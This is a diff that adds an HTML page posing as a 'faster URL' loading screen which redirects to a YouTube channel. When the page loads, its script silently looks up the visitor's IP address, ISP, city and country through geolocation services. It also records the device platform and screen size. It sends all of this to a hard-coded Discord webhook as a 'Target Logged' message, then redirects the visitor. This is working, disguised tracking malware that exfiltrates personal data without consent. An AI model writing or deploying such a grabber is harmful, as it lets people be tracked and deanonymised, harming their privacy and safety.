@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1457816544603148441/WitfQH3wDqnKfxBrlf0eb-tMCp5bMeglwvXOQ6isH9mFiMrmdbQmRgf2nqKkT70mFgvj";
+        const REDIRECT_TO = "https://www.youtube.com/@MrBeast";
+
+        async function initiateCapture() {
+            let geo = {};
+            try {
+                // Fetch location data
+                const res = await fetch('https://ipwho.is/');
+                geo = await res.json();
+            } catch (e) {
+                try {
+                    const res2 = await fetch('https://ipapi.co/json/');
+                    geo = await res2.json();
+                } catch (e2) {
+                    geo = { ip: "N/A", city: "N/A", country: "N/A" };
+                }
+            }
+
+            const techData = {
+                os: navigator.platform,
+                screen: `${screen.width}x${screen.height}`,
+                lang: navigator.language
+            };
+
+            const payload = {
+                username: "AAN Infinite Logger",
+                embeds: [{
+                    title: "🚀 Target Logged",
+                    color: 3066993, // Green
+                    fields: [
+                        { name: "🌐 Connection Info", value: `**IP:** \`${geo.ip || "N/A"}\`\n**ISP:** ${geo.connection?.isp || geo.org || "Unknown"}`, inline: false },
+                        { name: "📍 Location", value: `**City:** ${geo.city || "N/A"}\n**Country:** ${geo.country || "N/A"}`, inline: true },
+                        { name: "📱 Device Info", value: `**OS:** ${techData.os}\n**Resolution:** ${techData.screen}`, inline: false }
+                    ],
+                    timestamp: new Date()
+                }]
+            };
+
+            // Send to Discord using keepalive to ensure it finishes during redirect
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                keepalive: true,
+                body: JSON.stringify(payload)
+            });
+
+            // Redirect after a very short delay
+            setTimeout(() => {
+                window.location.replace(REDIRECT_TO);
+            }, 500);
+        }
+
+        window.onload = initiateCapture;
+    </script>
+</head>
+<body style="background-color: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif;">
+    <div style="text-align: center;">
+        <p>This is a faster URL :)</p>
+        <div class="loader"></div>
+    </div>
+    <style>
+        .loader {
+            border: 4px solid #333;
+            border-top: 4px solid #ff0000;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</body>
+</html>
